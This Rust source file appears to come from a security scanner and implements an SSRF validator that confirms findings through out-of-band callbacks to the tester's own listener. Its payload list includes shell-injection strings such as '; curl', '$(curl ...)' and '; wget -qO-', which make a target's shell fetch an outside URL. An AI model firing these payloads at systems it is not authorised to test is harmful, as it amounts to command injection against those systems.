//! SSRF validator — force the target to call our OOB listener and
//! correlate the unique token. Blind or not, the server-side fetch is
//! the only proof that counts.

use crate::finding::{Finding, FindingClass};
use crate::probe::ProbeClient;
use crate::validator::{send_value, Validator};
use crate::verdict::Verdict;
use aegis_sandbox::OobStore;
use std::time::Duration;

pub struct SsrfValidator {
    pub probe: ProbeClient,
    pub oob: OobStore,
    pub oob_base: String,
}

#[async_trait::async_trait]
impl Validator for SsrfValidator {
    fn class(&self) -> FindingClass {
        FindingClass::Ssrf
    }

    async fn validate(&self, f: &Finding) -> Verdict {
        let has_url = f.evidence["url"].as_str().is_some()
            || f.evidence["request"]["url"].as_str().is_some();
        if !has_url {
            return Verdict::Rejected { reason: "evidence missing url".into() };
        };

        let token = format!("ssrf{}", &uuid::Uuid::new_v4().simple().to_string()[..12]);
        let cb = format!("{}/{}/cb", self.oob_base, token);
        // Try every injection shape: bare URL for direct-fetch sinks,
        // command-chained forms for sinks gated behind shell metachars
        // (e.g. `; curl {cb}`), and template forms.
        let shapes = [
            cb.clone(),
            format!("; curl {cb}"),
            format!("| curl {cb}"),
            format!("; wget -qO- {cb}"),
            format!("$(curl {cb})"),
            format!("`curl {cb}`"),
        ];
        let mut ev = f.evidence.clone();
        let mut last_err = None;
        if ev["param"].as_str().is_some() {
            for shape in &shapes {
                match send_value(&self.probe, &ev, shape).await {
                    Err(e) => last_err = Some(e.to_string()),
                    Ok(_) => {}
                }
                // Early exit: a hit may already have landed.
                if !self.oob.hits_for(&token).is_empty() {
                    break;
                }
            }
        } else {
            ev["url"] = serde_json::json!(cb);
            if let Err(e) = send_value(&self.probe, &ev, "1").await {
                last_err = Some(e.to_string());
            }
        }
        if self.oob.hits_for(&token).is_empty() {
            if let Some(e) = last_err {
                tracing::debug!(err = %e, "ssrf trigger attempt errored");
            }
        }

        for _ in 0..10 {
            tokio::time::sleep(Duration::from_millis(500)).await;
            let hits = self.oob.hits_for(&token);
            if !hits.is_empty() {
                return Verdict::Verified {
                    reproduction: format!(
                        "OOB callback {cb} hit from {} ({} hits)",
                        hits[0].remote,
                        hits.len()
                    ),
                };
            }
        }
        Verdict::Rejected {
            reason: "no OOB interaction observed within 10s".into(),
        }
    }
}
